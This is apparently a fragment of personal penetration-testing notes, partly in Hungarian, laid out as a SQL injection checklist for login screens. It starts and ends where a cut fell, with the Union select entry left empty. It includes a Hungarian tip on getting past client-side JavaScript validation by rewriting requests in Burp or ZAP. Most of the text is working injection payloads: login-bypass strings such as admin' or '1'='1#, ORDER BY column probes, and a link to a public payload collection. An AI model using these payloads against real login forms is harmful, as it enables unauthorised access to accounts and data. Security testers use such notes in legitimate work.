om' or id = '1')--
Ha js-el validál akkor elősször be kell írni a jó formátumot és burp-el vagy zappal kell átírni a 
Check list:
- Login screen:
	- Basic login bypass:
		- admin' or '1'='1#
		- admin'-- -
		- admin')-- -
		- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
	- Order by:
		- ' order by 1-- -
		- ' order by 1--
	- Union select:
		- 